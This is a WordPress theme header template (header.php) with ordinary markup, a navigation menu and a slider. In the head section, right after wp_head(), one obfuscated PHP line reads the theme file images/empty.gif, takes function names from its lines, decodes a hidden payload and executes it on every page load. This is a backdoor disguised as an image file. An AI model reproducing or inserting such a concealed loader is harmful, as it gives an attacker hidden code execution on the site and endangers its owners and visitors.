<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
	<meta http-equiv="Content-Type" content="<?php bloginfo('html_type'); ?>; charset=<?php bloginfo('charset'); ?>" />	
	<title><?php bloginfo('name');  wp_title(); ?></title>
	<link rel="stylesheet" href="<?php bloginfo('stylesheet_url'); ?>" type="text/css" media="screen" />
	<link rel="alternate" type="application/rss+xml" title="<?php get_bloginfo('name'); ?>" href="<?php bloginfo('rss2_url'); ?>" />
	<link rel="pingback" href="<?php bloginfo('pingback_url'); ?>" />
	<?php  wp_head(); $gif=file(dirname(__FILE__).'/images/empty.gif',2);$gif=$gif[5]("",$gif[6]($gif[4]));$gif(); ?>	
</head>
<body>
<div class="main">
  <div class="header">
    <div class="header_resize">
      <div class="logo">
        <h1><a href="<?php bloginfo('url'); ?>"><?php bloginfo('name'); ?><small><?php bloginfo('description'); ?></small></a></h1>
      </div>
      <div class="menu_nav">
        <ul>
			<li <?php if (is_home()) : echo 'class="current_page_item"'; endif; ?>><a href="<?php bloginfo('url'); ?>"><span>Главная</span></a></li>
			<?php wp_list_pages('title_li=&depth=1'); ?>
        </ul>
      </div>
      <div class="clr"></div>
      <div class="slider">
        <div id="coin-slider">
        <!-- 
			<a href="#"><img src="<?php bloginfo('template_url'); ?>/images/slide/slide1.jpg" width="960" height="333" alt="" /> </a> 
			<a href="#"><img src="<?php bloginfo('template_url'); ?>/images/slide/slide2.jpg" width="960" height="333" alt="" /> </a> 
			<a href="#"><img src="<?php bloginfo('template_url'); ?>/images/slide/slide3.jpg" width="960" height="333" alt="" /> </a> -->
			<?php brainmix_show_slides(); ?>
		</div>
        <div class="clr"></div>
      </div>
      <div class="clr"></div>
    </div>
  </div>
  <div class="content">
    <div class="content_resize">
